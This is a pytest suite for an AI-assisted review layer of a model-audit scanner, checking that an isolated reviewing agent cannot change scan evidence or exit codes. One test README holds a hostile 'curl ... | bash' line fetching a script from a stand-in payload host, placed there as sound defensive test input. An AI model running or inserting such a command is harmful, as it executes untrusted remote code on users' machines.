"""Advisory review must never change scanner evidence or exit semantics."""

from __future__ import annotations

import json
import os
import signal
import socket
import subprocess
import sys
import time
from contextlib import suppress
from pathlib import Path
from typing import Any

import pytest
from pydantic import ValidationError

from modelaudit.review import runner
from modelaudit.review.bundle import digest, index_findings, snapshot
from modelaudit.review.codex import DockerReviewer, extract_response
from modelaudit.review.evaluate import replay, score
from modelaudit.review.gateway import request_body
from modelaudit.review.models import MAX_DOCUMENT_BYTES, AgentResponse, Assessment, Evidence, Finding
from modelaudit.review.process import ProcessLimitError, ProcessResult, run_bounded
from modelaudit.review.render import escaped

pytestmark = pytest.mark.skipif(os.name != "posix", reason="Isolated review prototype requires POSIX")


class FakeReviewer:
    def __init__(self, behavior: str = "benign_context") -> None:
        self.behavior = behavior
        self.calls = 0

    def review(self, findings: list[Finding], evidence: list[Evidence], artifacts: Path, output: Path) -> AgentResponse:
        self.calls += 1
        if self.behavior == "timeout":
            raise TimeoutError("bounded timeout")
        if self.behavior == "refusal":
            raise ValueError("model refused")
        assessments = [
            Assessment(
                finding_id=f.finding_id,
                assessment="benign_context",
                context="documentation",
                trigger="user_follows_documentation",
                explanation="The URL belongs to a documented setup command.",
                evidence_ids=f.evidence_ids,
                execution_implications="Following setup instructions can execute third-party code.",
                limitations=["Downloaded code was not reviewed."],
            )
            for f in findings
        ]
        if self.behavior == "missing":
            assessments.pop()
        elif self.behavior == "duplicate":
            assessments.append(assessments[0])
        elif self.behavior == "unknown":
            assessments[0] = assessments[0].model_copy(update={"finding_id": "unknown"})
        elif self.behavior == "bad_citation":
            assessments[0] = assessments[0].model_copy(update={"evidence_ids": ["not-evidence"]})
        elif self.behavior == "model_load":
            assessments[0] = assessments[0].model_copy(update={"trigger": "model_load"})
        elif self.behavior == "actionable":
            assessments = [a.model_copy(update={"assessment": "actionable"}) for a in assessments]
        return AgentResponse(assessments=assessments)


def fake_scan(monkeypatch: pytest.MonkeyPatch, exit_code: int, *, malformed: bool = False) -> list[bytes]:
    captured: list[bytes] = []

    def scan(command: list[str], output: Path) -> int:
        location = command[4]
        record = {
            "severity": "warning",
            "message": "Network URL detected",
            "location": location,
            "details": {"type": "url_detected", "url": "https://github.com/example/model"},
            "rule_code": "S402",
        }
        report = {
            "issues": [record, {"severity": "critical", "message": "Pickle execution", "location": "model.pkl"}],
            "checks": [{**record, "name": "Network Communication Detection", "status": "failed"}],
            "success": exit_code != 2,
            "files_scanned": 1,
            "bytes_scanned": 100,
            "has_errors": exit_code != 0,
            "start_time": 0,
            "duration": 0,
            "total_checks": 1,
            "passed_checks": 0,
            "failed_checks": 1,
        }
        raw = b"not JSON" if malformed else json.dumps(report, indent=3).encode() + b"\n\n"
        (output / "scan.json").write_bytes(raw)
        captured.append(raw)
        return exit_code

    monkeypatch.setattr(runner, "run_scan", scan)
    return captured


@pytest.mark.parametrize("exit_code", [0, 1, 2])
@pytest.mark.parametrize(
    "behavior",
    [
        "benign_context",
        "actionable",
        "timeout",
        "refusal",
        "missing",
        "duplicate",
        "unknown",
        "bad_citation",
        "model_load",
    ],
)
def test_scanner_bytes_findings_and_exit_survive_every_review_outcome(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, exit_code: int, behavior: str
) -> None:
    source = tmp_path / "README.md"
    source.write_text("# Setup\n```sh\ngit clone https://github.com/example/model\n```\n")
    captured = fake_scan(monkeypatch, exit_code)
    output = tmp_path / "bundle"
    assert runner.run(source, output, FakeReviewer(behavior)) == exit_code
    assert (output / "scan.json").read_bytes() == captured[0]
    manifest = json.loads((output / "manifest.json").read_bytes())
    assert manifest["scan_exit_code"] == exit_code
    assert manifest["scan_sha256"] == digest(captured[0])
    review = json.loads((output / "review.json").read_bytes())
    assert len(review["entries"]) == 3
    untouched = next(entry for entry in review["entries"] if entry["pointer"] == "/issues/1")
    assert untouched["status"] == "not_reviewed"
    assert untouched["display_action"] == "retain"
    if behavior in {"benign_context", "actionable"}:
        assert review["review_status"] == "complete"
        expected_action = "de_emphasize" if behavior == "benign_context" and exit_code != 2 else "retain"
        assert review["entries"][0]["display_action"] == expected_action
    else:
        assert review["review_status"] == "failed"
        assert all(entry["display_action"] == "retain" for entry in review["entries"])


@pytest.mark.parametrize("exit_code", [0, 1, 2])
def test_invalid_scanner_json_does_not_replace_exit(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, exit_code: int
) -> None:
    source = tmp_path / "README.md"
    source.write_text("model card")
    raw = fake_scan(monkeypatch, exit_code, malformed=True)
    assert runner.run(source, tmp_path / "bundle", FakeReviewer()) == exit_code
    assert (tmp_path / "bundle/scan.json").read_bytes() == raw[0]
    assert json.loads((tmp_path / "bundle/review.json").read_bytes())["review_status"] == "failed"


def test_advisory_write_failure_keeps_exit(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    source = tmp_path / "README.md"
    source.write_text("model card")
    fake_scan(monkeypatch, 1)

    def broken_write(path: Path, value: Any) -> None:
        raise OSError("Disk full")

    monkeypatch.setattr(runner, "write_json", broken_write)
    assert runner.run(source, tmp_path / "bundle", FakeReviewer()) == 1


@pytest.mark.parametrize("exit_code", [0, 1, 2])
@pytest.mark.parametrize("stage", ["manifest.json", "review.json", "review.md", "diagnostic"])
@pytest.mark.parametrize("failure", [KeyboardInterrupt, OSError])
def test_final_output_failures_preserve_captured_exit(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, exit_code: int, stage: str, failure: type[BaseException]
) -> None:
    source = tmp_path / "README.md"
    source.write_text("model card")
    captured = fake_scan(monkeypatch, exit_code)
    original_write = Path.write_text

    def write(path: Path, data: str, *args: Any, **kwargs: Any) -> int:
        if path.name == stage:
            raise failure("final output failed")
        return original_write(path, data, *args, **kwargs)

    def diagnostic(*args: Any, **kwargs: Any) -> None:
        raise failure("diagnostic output failed")

    if stage == "diagnostic":
        monkeypatch.setattr(runner, "print", diagnostic, raising=False)
    else:
        monkeypatch.setattr(Path, "write_text", write)
    output = tmp_path / "bundle"
    assert runner.run(source, output, FakeReviewer()) == exit_code
    assert (output / "scan.json").read_bytes() == captured[0]


def test_prepare_only_never_calls_agent(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    source = tmp_path / "README.md"
    source.write_text("# Setup\ngit clone https://github.com/example/model")
    fake_scan(monkeypatch, 1)
    assert runner.run(source, tmp_path / "bundle", None) == 1
    report = json.loads((tmp_path / "bundle/review.json").read_bytes())
    assert report["review_status"] == "not_requested"
    assert report["selected_count"] == 2
    assert all(item["display_action"] == "retain" for item in report["entries"])


@pytest.mark.parametrize("filename", ["README.md", "readme", "model-card.md", "MODEL_CARD.txt", "modelcard.md"])
@pytest.mark.parametrize("newline", [b"\n", b"\r\n"])
def test_full_document_preserves_later_fences_and_raw_byte_citations(
    tmp_path: Path, filename: str, newline: bytes
) -> None:
    source = tmp_path / filename
    data = newline.join(
        [
            b"# Model",
            b"```sh",
            b"git clone https://github.com/example/model",
            b"```",
            b"Then run:",
            b"```sh",
            b"python model/install.py",
            b"```",
            b"",
        ]
    )
    source.write_bytes(data)
    root = tmp_path / "snapshot"
    artifacts = snapshot(source, root, max_bytes=10000)
    raw = {"issues": [{"location": str(root / filename), "severity": "warning", "details": {"type": "url_detected"}}]}
    findings, evidence = index_findings(raw, "report-digest", root, artifacts)
    assert findings[0].selected
    assert evidence[0].text.encode() == data
    assert evidence[0].complete
    assert evidence[0].line_end == 8
    assert evidence[0].byte_end == len(data)
    assert evidence[0].sha256 == digest(data)
    assert "python model/install.py" in evidence[0].text


@pytest.mark.parametrize("data", [b"x" * (MAX_DOCUMENT_BYTES + 1), b"\xff\xfe"])
def test_incomplete_context_cannot_be_deemphasized(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, data: bytes
) -> None:
    source = tmp_path / "README.md"
    source.write_bytes(data)
    fake_scan(monkeypatch, 1)
    reviewer = FakeReviewer()
    assert runner.run(source, tmp_path / "bundle", reviewer) == 1
    assert reviewer.calls == 0
    report = json.loads((tmp_path / "bundle/review.json").read_bytes())
    assert report["review_status"] == "failed"
    assert all(item["display_action"] == "retain" for item in report["entries"])


def test_scope_excludes_other_readme_security_findings(tmp_path: Path) -> None:
    source = tmp_path / "README.md"
    source.write_text("secret")
    root = tmp_path / "snapshot"
    artifacts = snapshot(source, root, max_bytes=100)
    findings, _ = index_findings(
        {"issues": [{"location": str(root / "README.md"), "rule_code": "S702", "details": {"type": "secret"}}]},
        "hash",
        root,
        artifacts,
    )
    assert not findings[0].selected


@pytest.mark.parametrize("kind", ["symlink", "fifo", "byte_limit", "entry_limit"])
def test_snapshot_fails_closed(tmp_path: Path, kind: str) -> None:
    source = tmp_path / "input"
    source.mkdir()
    (source / "README.md").write_bytes(b"1234")
    if kind == "symlink":
        outside = tmp_path / "outside"
        outside.write_text("private")
        (source / "link").symlink_to(outside)
    elif kind == "fifo":
        os.mkfifo(source / "fifo")
    with pytest.raises(ValueError):
        snapshot(
            source,
            tmp_path / "snapshot",
            max_bytes=2 if kind == "byte_limit" else 100,
            max_files=1 if kind == "entry_limit" else 100,
        )


def test_changed_document_is_rejected(tmp_path: Path) -> None:
    source = tmp_path / "README.md"
    source.write_text("before")
    root = tmp_path / "snapshot"
    artifacts = snapshot(source, root, max_bytes=100)
    copy = root / "README.md"
    copy.chmod(0o600)
    copy.write_text("after!")
    with pytest.raises(ValueError, match="digest changed"):
        index_findings(
            {"issues": [{"location": str(copy), "severity": "warning", "details": {"type": "url_detected"}}]},
            "hash",
            root,
            artifacts,
        )


def test_failed_snapshot_never_starts_scanner(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    source = tmp_path / "README.md"
    source.write_text("large")
    captured = fake_scan(monkeypatch, 0)
    assert runner.run(source, tmp_path / "bundle", None, max_snapshot_bytes=1) == 2
    assert not captured
    assert json.loads((tmp_path / "bundle/manifest.json").read_bytes())["scan_status"] == "not_run"
    with pytest.raises(ValueError, match="outside"):
        runner.run(tmp_path, tmp_path / "nested", None)


def test_codex_requires_completed_structured_turn() -> None:
    for events in (b"{}\n", b'{"type":"turn.failed"}\n', b"not-json\n"):
        with pytest.raises(ValueError):
            extract_response(events)
    with pytest.raises(ValidationError):
        AgentResponse.model_validate({"assessments": [], "scan_exit_code": 0})


@pytest.mark.parametrize(
    "program,limit,error",
    [
        ("import time; time.sleep(30)", 100, TimeoutError),
        ("print('x' * 10000)", 100, ValueError),
    ],
)
def test_process_bounds(tmp_path: Path, program: str, limit: int, error: type[Exception]) -> None:
    with pytest.raises(ProcessLimitError) as failure:
        run_bounded([sys.executable, "-c", program], cwd=tmp_path, timeout=0.3, max_output=limit)
    assert isinstance(failure.value.__cause__, error)


@pytest.mark.parametrize("umask", [0o022, 0o077])
def test_docker_worker_has_no_host_fallback_and_always_cleans_up(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, umask: int
) -> None:
    calls: list[list[str]] = []

    def execute(argv: list[str], **kwargs: Any) -> ProcessResult:
        calls.append(argv)
        if argv[1:3] == ["network", "inspect"]:
            return ProcessResult(0, b'[{"Internal":true,"Driver":"bridge"}]', b"")
        if argv[1] == "run":
            raise TimeoutError("worker deadline")
        return ProcessResult(0, b"", b"")

    monkeypatch.setattr("modelaudit.review.codex.run_bounded", execute)
    reviewer = DockerReviewer("sha256:" + "a" * 64, "review-private", "http://gateway:8080/v1", "test-model")
    previous_umask = os.umask(umask)
    try:
        with pytest.raises(TimeoutError):
            reviewer.review([], [], tmp_path, tmp_path)
    finally:
        os.umask(previous_umask)
    assert (tmp_path / "request").stat().st_mode & 0o777 == 0o755
    assert (tmp_path / "request/schema.json").stat().st_mode & 0o777 == 0o444
    command = next(c for c in calls if c[1] == "run")
    assert "--read-only" in command and "--cap-drop=ALL" in command
    assert "--user" in command and "10001:10001" in command
    assert "--security-opt=no-new-privileges" in command
    assert all("readonly" in command[i + 1] for i, token in enumerate(command) if token == "--mount")
    assert not any("OPENAI_API_KEY" in arg or "docker.sock" in arg for arg in command)
    environment = [command[index + 1] for index, token in enumerate(command) if token == "--env"]
    for key in ("HTTP_PROXY", "HTTPS_PROXY", "FTP_PROXY", "ALL_PROXY", "NO_PROXY"):
        assert f"{key}=" in environment and f"{key.lower()}=" in environment
    assert calls[-1][1:3] == ["rm", "--force"]


@pytest.mark.parametrize("image,internal", [("worker:latest", True), ("sha256:" + "a" * 64, False)])
def test_unpinned_or_externally_networked_worker_is_rejected(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, image: str, internal: bool
) -> None:
    def execute(argv: list[str], **kwargs: Any) -> ProcessResult:
        return ProcessResult(0, json.dumps([{"Internal": internal, "Driver": "bridge"}]).encode(), b"")

    monkeypatch.setattr("modelaudit.review.codex.run_bounded", execute)
    with pytest.raises(ValueError):
        DockerReviewer(image, "review", "http://gateway:8080/v1", "test-model").validate(tmp_path)


def test_gateway_is_model_and_tool_scoped() -> None:
    result = json.loads(request_body(b'{"model":"test-model","max_output_tokens":10000}', "test-model"))
    assert result["max_output_tokens"] == 4096 and result["store"] is False
    for body in (
        {"model": "other"},
        {"model": "test-model", "background": True},
        {"model": "test-model", "tools": [{"type": "web_search"}]},
    ):
        with pytest.raises(ValueError):
            request_body(json.dumps(body).encode(), "test-model")


@pytest.mark.parametrize("kind", ["function", "custom"])
@pytest.mark.parametrize("in_input", [False, True])
def test_gateway_accepts_codex_client_tool_namespaces(kind: str, in_input: bool) -> None:
    tool = {"type": "namespace", "name": "clock", "tools": [{"type": kind, "name": "sleep"}]}
    body: dict[str, Any] = {"model": "test-model"}
    if in_input:
        body["input"] = [{"type": "additional_tools", "role": "developer", "tools": [tool]}]
    else:
        body["tools"] = [tool]
    result = json.loads(request_body(json.dumps(body).encode(), "test-model"))
    assert (result["input"][0]["tools"] if in_input else result["tools"]) == [tool]


@pytest.mark.parametrize("kind", ["web_search", "computer", "mcp", "namespace"])
@pytest.mark.parametrize("in_input", [False, True])
def test_gateway_rejects_hosted_tools_inside_namespace(kind: str, in_input: bool) -> None:
    tool = {"type": "namespace", "name": "hidden", "tools": [{"type": kind, "name": "remote"}]}
    body: dict[str, Any] = {"model": "test-model"}
    if in_input:
        body["input"] = [{"type": "additional_tools", "role": "developer", "tools": [tool]}]
    else:
        body["tools"] = [tool]
    with pytest.raises(ValueError, match="client-side"):
        request_body(json.dumps(body).encode(), "test-model")


def test_render_does_not_activate_artifact_markup_or_controls() -> None:
    output = escaped('<img src="https://example.com"> ![x](https://example.com)\x1b[2J')
    assert "<img" not in output and "![" not in output and "\x1b" not in output
    assert "\\u001b" in output


def test_pr1913_recorded_cases_remain_blind_and_preserve_baseline(tmp_path: Path) -> None:
    fixture_path = Path(__file__).parent / "assets" / "agent_review_pr1913.json"
    fixture = json.loads(fixture_path.read_bytes())
    assert fixture["provenance"]["scanner_revision"] == "80294cd6620c3eeccdbc0ece233939a6e48c1cc2"
    results = []

    class BlindReviewer(FakeReviewer):
        def review(
            self, findings: list[Finding], evidence: list[Evidence], artifacts: Path, output: Path
        ) -> AgentResponse:
            request = json.dumps([f.model_dump() for f in findings] + [e.model_dump() for e in evidence])
            assert "expected_display" not in request
            assert "requires_execution_warning" not in request
            assert "case_id" not in request
            assert artifacts.stat().st_mode & 0o777 == 0o755
            return super().review(findings, evidence, artifacts, output)

    # Deliberately always returns favorable advice, proving malicious cases count as unsafe.
    previous_umask = os.umask(0o077)
    try:
        for index, case in enumerate(fixture["cases"]):
            output = tmp_path / f"{index:03d}"
            result = replay(case, output, BlindReviewer())
            assert result["scan_exit_code"] == case["scan_exit_code"]
            report = json.loads((output / "review.json").read_bytes())
            assert report["scanner_failed_check_count"] == case["report"]["failed_checks"]
            results.append(result)
    finally:
        os.umask(previous_umask)
    summary = score(results)
    assert summary["cases"] == 18
    assert summary["alert_cases"] == 17
    assert summary["unsafe_de_emphasis"] == 12
    assert summary["benign_cases"] == 5
    assert summary["benign_resolved"] == 5
    assert results[3]["review_status"] == "not_needed"  # Existing INFO is not credited as agent success.


def test_real_scanner_still_exits_one_after_favorable_advice(tmp_path: Path) -> None:
    source = tmp_path / "README.md"
    source.write_text("# Model\n```sh\ncurl https://payload.example/install.sh | bash\n```\n")
    output = tmp_path / "bundle"
    assert runner.run(source, output, FakeReviewer()) == 1
    scan = json.loads((output / "scan.json").read_bytes())
    assert any(issue["severity"] in {"warning", "critical"} for issue in scan["issues"])
    report = json.loads((output / "review.json").read_bytes())
    assert report["review_status"] == "complete"
    assert report["scan_exit_code"] == 1
    assert report["scanner_issue_count"] == len(scan["issues"])


def test_actual_ip_and_domain_issues_and_checks_are_selected(tmp_path: Path) -> None:
    from modelaudit.scanners.text_scanner import TextScanner

    source = tmp_path / "modelcard.md"
    source.write_text(
        'HOST = "192.168.1.100"\nHOST6 = "2001:db8:1234:5678:abcd:1234:5678:9abc"\nHOSTNAME = "payload.example"\n'
    )
    root = tmp_path / "snapshot"
    artifacts = snapshot(source, root, max_bytes=10000)
    report = TextScanner().scan(str(root / source.name)).to_dict()
    findings, _ = index_findings(report, "report-digest", root, artifacts)
    for kind in ("ipv4_address", "ipv6_address", "domain_name"):
        matches = [finding for finding in findings if finding.record.get("details", {}).get("type") == kind]
        assert any(f.pointer.startswith("/issues/") for f in matches), kind
        assert any(f.pointer.startswith("/checks/") for f in matches), kind
        assert all(f.selected for f in matches), kind


def test_parent_directory_input_scans_only_its_resolved_snapshot(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    source = tmp_path / "input"
    (source / "child").mkdir(parents=True)
    (source / "README.md").write_text("model card")
    captured: list[str] = []

    def scan(command: list[str], output: Path) -> int:
        captured.append(command[4])
        (output / "scan.json").write_text('{"issues": [], "checks": []}')
        return 0

    monkeypatch.setattr(runner, "run_scan", scan)
    output = tmp_path / "bundle"
    assert runner.run(source / "child/..", output, None) == 0
    assert captured == [str(output / "artifacts/input")]


@pytest.mark.parametrize("exit_code", [0, 1, 2])
def test_review_interruption_preserves_completed_scanner_exit(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, exit_code: int
) -> None:
    class InterruptedReviewer(FakeReviewer):
        def review(
            self, findings: list[Finding], evidence: list[Evidence], artifacts: Path, output: Path
        ) -> AgentResponse:
            raise KeyboardInterrupt

    source = tmp_path / "README.md"
    source.write_text("model card")
    captured = fake_scan(monkeypatch, exit_code)
    output = tmp_path / "bundle"
    assert runner.run(source, output, InterruptedReviewer()) == exit_code
    assert (output / "scan.json").read_bytes() == captured[0]
    manifest = json.loads((output / "manifest.json").read_bytes())
    review = json.loads((output / "review.json").read_bytes())
    assert manifest["scan_exit_code"] == review["scan_exit_code"] == exit_code
    assert manifest["scan_sha256"] == review["scan_sha256"] == digest(captured[0])
    assert review["review_status"] == "failed"
    assert "interrupted" in review["errors"][0]


def test_scanner_cancellation_kills_descendants(tmp_path: Path) -> None:
    group_path = tmp_path / "scanner-group.txt"
    with socket.create_server(("127.0.0.1", 0)) as listener:
        listener.settimeout(10)
        child = (
            "import socket,time; "
            f"connection=socket.create_connection({listener.getsockname()!r}); "
            "connection.sendall(b'ready'); time.sleep(60)"
        )
        scanner = (
            "import os,subprocess,sys; from pathlib import Path; "
            f"Path({str(group_path)!r}).write_text(str(os.getpgrp())); "
            f"subprocess.run([sys.executable,'-c',{child!r}],check=True)"
        )
        driver = (
            "import signal,sys; from pathlib import Path\n"
            "from modelaudit.review.runner import run_scan\n"
            "from modelaudit.review.process import terminate\n"
            "signal.signal(signal.SIGTERM,terminate)\n"
            "try:\n"
            f"    run_scan([sys.executable,'-c',{scanner!r}],Path({str(tmp_path)!r}))\n"
            "except KeyboardInterrupt:\n"
            "    sys.exit(2)\n"
        )
        with subprocess.Popen(
            [sys.executable, "-c", driver],
            env={"PYTHONPATH": str(Path(runner.__file__).resolve().parents[2])},
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            start_new_session=True,
        ) as process:
            try:
                connection, _ = listener.accept()
                with connection:
                    connection.settimeout(10)
                    assert connection.recv(5, socket.MSG_WAITALL) == b"ready"
                    process.send_signal(signal.SIGTERM)
                    assert process.wait(timeout=10) == 2
                    assert connection.recv(1) == b""
            finally:
                if group_path.exists():
                    with suppress(ProcessLookupError):
                        os.killpg(int(group_path.read_text()), signal.SIGKILL)
                with suppress(ProcessLookupError):
                    os.killpg(process.pid, signal.SIGKILL)
                process.wait(timeout=10)


def test_evaluator_sigterm_removes_daemon_owned_worker(tmp_path: Path) -> None:
    binary = tmp_path / "bin"
    binary.mkdir()
    active = tmp_path / "worker.json"
    removed = tmp_path / "removed.txt"
    docker = binary / "docker"
    docker.write_text(
        f"#!{sys.executable}\n"
        "import json,os,sys,time\nfrom pathlib import Path\n"
        "if sys.argv[1:3] == ['network','inspect']:\n"
        '    print(\'[{"Internal":true,"Driver":"bridge"}]\')\n'
        "elif sys.argv[1] == 'run':\n"
        f"    pending=Path({str(active.with_suffix('.pending'))!r})\n"
        "    pending.write_text(json.dumps({'group':os.getpgrp()}))\n"
        f"    pending.rename({str(active)!r})\n"
        "    time.sleep(60)\n"
        "elif sys.argv[1:3] == ['rm','--force']:\n"
        f"    Path({str(removed)!r}).write_text(sys.argv[3])\n"
        f"    Path({str(active)!r}).unlink(missing_ok=True)\n"
    )
    docker.chmod(0o755)
    fixture = Path(__file__).parent / "assets/agent_review_pr1913.json"
    command = [
        sys.executable,
        "-m",
        "modelaudit.review.evaluate",
        "--cases",
        str(fixture),
        "--output-dir",
        str(tmp_path / "evaluation"),
        "--runs",
        "1",
        "--worker-image",
        "sha256:" + "a" * 64,
        "--worker-network",
        "review",
        "--proxy-url",
        "http://gateway:8080/v1",
        "--codex-model",
        "test-model",
    ]
    worker_group: int | None = None
    with subprocess.Popen(
        command,
        env={
            "PATH": str(binary) + os.pathsep + os.defpath,
            "PYTHONPATH": str(Path(runner.__file__).resolve().parents[2]),
        },
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        start_new_session=True,
    ) as process:
        try:
            deadline = time.monotonic() + 10
            while not active.exists() and process.poll() is None and time.monotonic() < deadline:
                time.sleep(0.05)
            assert active.exists(), "Evaluator did not start the worker"
            worker_group = json.loads(active.read_bytes())["group"]
            process.send_signal(signal.SIGTERM)
            assert process.wait(timeout=10) == 2
            assert removed.read_text().startswith("modelaudit-review-")
            assert not active.exists()
        finally:
            if worker_group is not None:
                with suppress(ProcessLookupError):
                    os.killpg(worker_group, signal.SIGKILL)
            with suppress(ProcessLookupError):
                os.killpg(process.pid, signal.SIGKILL)
            process.wait(timeout=10)


@pytest.mark.parametrize("max_groups", [1, 8])
def test_failed_or_budget_blocked_group_does_not_discard_completed_group(tmp_path: Path, max_groups: int) -> None:
    from modelaudit.review.models import Artifact

    fixture = json.loads((Path(__file__).parent / "assets/agent_review_pr1913.json").read_bytes())
    case = fixture["cases"][0]
    root = tmp_path / "artifacts"
    root.mkdir()
    artifacts = []
    records = []
    for filename in ("README.md", "model-card.md"):
        content = case["document"].encode()
        (root / filename).write_bytes(content)
        artifacts.append(Artifact(path=filename, sha256=digest(content), size=len(content), role="documentation"))
        records.append({**case["report"]["issues"][0], "location": str(root / filename)})
    report = {**case["report"], "issues": records, "checks": []}
    raw = json.dumps(report).encode()
    (tmp_path / "scan.json").write_bytes(raw)

    class PartialReviewer(FakeReviewer):
        def review(
            self, findings: list[Finding], evidence: list[Evidence], artifacts: Path, output: Path
        ) -> AgentResponse:
            if self.calls:
                raise TimeoutError("second document timed out")
            return super().review(findings, evidence, artifacts, output)

    result = runner.review_findings(report, raw, 1, artifacts, root, tmp_path, PartialReviewer(), max_groups=max_groups)
    assert result.review_status == "partial"
    assert result.reviewed_count == 1 and result.selected_count == 2
    assert [item.display_action for item in result.entries] == ["de_emphasize", "retain"]
    assert result.entries[1].status == ("not_reviewed" if max_groups == 1 else "failed")
    assert (tmp_path / "scan.json").read_bytes() == raw
